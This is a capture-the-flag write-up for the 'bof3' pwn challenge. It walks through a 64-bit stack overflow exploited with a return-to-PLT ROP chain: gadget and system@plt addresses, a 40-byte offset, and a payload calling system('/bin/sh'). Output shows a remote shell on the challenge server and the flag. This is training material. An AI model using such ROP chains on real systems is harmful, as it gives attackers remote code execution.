# bof3
Pwn

## Challenge 

Where do you go when you can no longer call getflag()?

nc challs.hats.sg 1303

UPDATED Reading material:

https://www.ret2rop.com/2018/08/return-to-plt-got-to-bypass-aslr-remote.html (Return to PLT section)
Author: @dickheadedzed

## Hint

system() is such a weird function. It asks so much from the caller! One, which you might have encountered, is the stack alignment issue. Another is that there is actually a second argument to system(), that should be null. Or, in terms of assembly, you will need to set RSI to 0 before calling system()

## Solution

Reference: 

- https://www.pwndiary.com/write-ups/p-w-n-ctf-2018-babypwn-write-up-pwn115/
- https://bitvijays.github.io/LFC-BinaryExploitation.html#find-the-offset-of-system-exit-and-bin-sh
- https://www.ret2rop.com/2018/08/return-to-plt-got-to-bypass-aslr-remote.html

Decompiled code

	int main() {
	    banner();
	    read(0x0, &var_20, 0x100);
	    printf("uh so ok, %s, seems like getflag aint workin. have fun bye! try /bin/sh", &var_20);
	    return 0x0;
	}

### Return to PLT attack on 64-bit system.

In hopper decompiler, find the addresses.

Find address of system@plt:

	system@GOT:        // system
	0000000000404020         dq         0x0000000000405008      ; DATA XREF=j_system

	j_system:        // system
	0000000000401040         jmp        qword [system@GOT]      ; system, system@GOT, CODE XREF=getflag+28

Find address of `pop rdi`:

	# ROPgadget --binary bof3 --only "pop|ret" | grep rdi
		0x00000000004012bb : pop rdi ; ret

Find address of `/bin/sh`:

	aUhSoOkSSeemsLi:
	0000000000402060         db         "uh so ok, %s, seems like getflag aint workin. have fun bye! try /bin/sh", 0 ; DATA XREF=main+47

Hence we have the addresses:

	addr_pop_rdi = 0x4012bb
	addr_bin_sh  = 0x4020A0
	addr_system_plt = 0x401040

Fuzz for offset = 40.

	$ pwn cyclic 40 | strace ./bof3

Creating the payload

	addr_pop_rdi = 0x4012bb
	addr_bin_sh  = 0x4020A0
	addr_system_plt = 0x401040

	payload = 'A' * 40
	payload += p64(addr_pop_rdi)
	payload += p64(addr_bin_sh)
	payload += p64(addr_system_plt)

And put it into a python script

	$ python3 solve.py 
	b'*** WELCOME TO bof3.c ***\nuh so ok, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xbb\x12@, seems like getflag aint workin. have fun bye! try /bin/sh'
	ls -la
	total 64
	drwxr-x--- 1 0 1000  4096 Sep  9 09:43 .
	drwxr-x--- 1 0 1000  4096 Sep  9 09:43 ..
	-rwxr-x--- 1 0 1000   220 Aug 31  2015 .bash_logout
	-rwxr-x--- 1 0 1000  3771 Aug 31  2015 .bashrc
	-rwxr-x--- 1 0 1000   655 May 16  2017 .profile
	drwxr-x--- 1 0 1000  4096 Oct 19  2018 bin
	-rwxr-xr-x 1 0    0 16864 Sep  7 06:58 bof3
	drwxr-x--- 1 0 1000  4096 Oct 19  2018 dev
	-rw-r--r-- 1 0    0    20 Sep  6 17:31 flag
	drwxr-x--- 1 0 1000  4096 Oct 19  2018 lib
	drwxr-x--- 1 0 1000  4096 Oct 19  2018 lib32
	drwxr-x--- 1 0 1000  4096 Oct 19  2018 lib64
	cat flag
	HATS{r0p_r0p_no0se}

## Flag

	HATS{r0p_r0p_no0se}
